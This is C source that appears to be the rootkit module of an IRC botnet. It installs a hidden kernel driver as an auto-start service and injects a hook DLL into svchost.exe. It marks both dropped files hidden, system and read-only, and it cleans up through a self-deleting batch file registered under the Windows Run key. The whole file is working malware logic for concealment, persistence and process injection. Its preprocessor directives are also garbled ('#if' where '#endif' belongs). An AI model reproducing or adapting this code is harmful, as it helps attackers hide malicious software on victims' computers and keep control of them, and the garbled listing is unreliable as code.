

#include "bt1.h"

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_KERNELKIT
//Install The Kernel rt07
bool uninstall_kernelkit()
{
	char szInstallPath[MAX_PATH], szSysDir[MAX_PATH];

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DEBUG
		printf("[DEBUG] Unnstalling kernel kit, uninstall_kernelkit()\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		GetSystemDirectory(szSysDir, sizeof(szSysDir));
		sprintf(szInstallPath, "%s\\%s", szSysDir, driverfilename);
	if (!uninstall_service((char *)drivername)) return FALSE;
	if (!delete_file(szInstallPath)) return FALSE;
		return TRUE;
}
bool install_kernelkit()
{
	char szInstallPath[MAX_PATH], szSysDir[MAX_PATH];
	if (is_os9x()) return FALSE;
	if (!is_osnt()) return FALSE;

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DEBUG
		printf("[DEBUG] Installing kernel kit, install_kernelkit()\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		GetSystemDirectory(szSysDir, sizeof(szSysDir));
		sprintf(szInstallPath, "%s\\%s", szSysDir, driverfilename);
	if (!file_exists(szInstallPath)) extract_resource("driver", "RT_RCDATA", szInstallPath);
		SetFileAttributes(szInstallPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_SERVICE
	if (install_service((char *)drivername, szInstallPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE)) return TRUE;
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		return FALSE;
}

//Uninstall The Kernel rt07

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_USERKIT
//Install The User Hook

//Uninstall The User Hook
bool uninstall_userkit()
{
	char szBatPath[MAX_PATH], szInstallPath[MAX_PATH], szMeltText[IRCBUF], szSysDir[MAX_PATH], szTempDir[MAX_PATH];
	DWORD r;
	HANDLE hFile;

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DEBUG
		printf("[DEBUG] Uninstalling user kit, uninstall_userkit()\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if	

		GetSystemDirectory(szSysDir, sizeof(szSysDir));
		sprintf(szInstallPath, "%s\\%s", szSysDir, hookfilename);
		GetTempPath(sizeof(szTempDir), szTempDir);
		sprintf(szBatPath, "%stmp.bat", szTempDir);
		sprintf(szMeltText,
				"@echo off\r\n"
				":start\r\n"
				"attrib \"%s\" -R -A -S -H\r\n"
				"del \"%s\"\r\n"
				"if exist \"%s\" goto start\r\n"
				"del \"%s\"",
				szInstallPath, szInstallPath, szInstallPath, szBatPath);
		hFile = CreateFile(szBatPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
			CloseHandle(hFile);
			return FALSE;
	}
		WriteFile(hFile, szMeltText, strlen(szMeltText), &r, NULL);
		CloseHandle(hFile);
		regwritekey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",(char *)regkeyname, szBatPath);
		return TRUE;
}
bool install_userkit()
{
	char szInstallPath[MAX_PATH], szSysDir[MAX_PATH];

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_DEBUG
		printf("[DEBUG] Installing user kit, install_userkit()\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if	

		GetSystemDirectory(szSysDir, sizeof(szSysDir));
		sprintf(szInstallPath, "%s\\%s", szSysDir, hookfilename);
	if (!file_exists(szInstallPath)) extract_resource("hooker", "RT_RCDATA", szInstallPath);
		SetFileAttributes(szInstallPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef NO_INJECTION
	if (inject_library("svchost.exe", szInstallPath)) return TRUE;
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	return FALSE;
}
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if